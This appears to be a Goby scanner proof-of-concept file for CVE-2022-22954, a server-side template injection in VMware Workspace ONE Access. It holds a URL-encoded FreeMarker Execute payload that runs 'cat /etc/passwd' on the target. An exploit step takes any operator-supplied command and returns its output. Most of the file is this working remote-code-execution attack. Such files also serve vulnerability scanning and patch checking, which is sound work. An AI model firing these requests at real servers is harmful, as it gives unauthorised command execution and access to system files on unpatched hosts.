{
      "Name": "VMware Workspace ONE Access RCE CVE-2022-22954 vmware-workspace-one",
      "Level": "3",
      "Tags": [
            "rce"
      ],
      "GobyQuery": "icon_hash=\"-1250474341\"",
      "Description": "VMware Workspace ONE Access™ (formerly called VMware Identity Manager) is a key component of VMware Workspace ONE®.",
      "Product": "VMware Workspace ONE Access",
      "Homepage": "https://www.vmware.com/products/workspace-one/access.html.html",
      "Author": "",
      "Impact": "VMware Workspace ONE Access and Identity Manager contain a remote code execution vulnerability due to server-side template injection. A malicious actor with network access can trigger a server-side template injection that may result in remote code execution.",
      "Recommendation": "https://www.vmware.com/security/advisories/VMSA-2022-0011.html",
      "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-22954",
            "https://www.vmware.com/security/advisories/VMSA-2022-0011.html"
      ],
      "HasExp": true,
      "ExpParams": [
            {
                  "Name": "Cmd",
                  "Type": "input",
                  "Value": "%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64"
            }
      ],
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "400",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "root:",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%7b%7b%7b%43%6d%64%7d%7d%7d%22%29%7d",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "400",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|(.*)"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}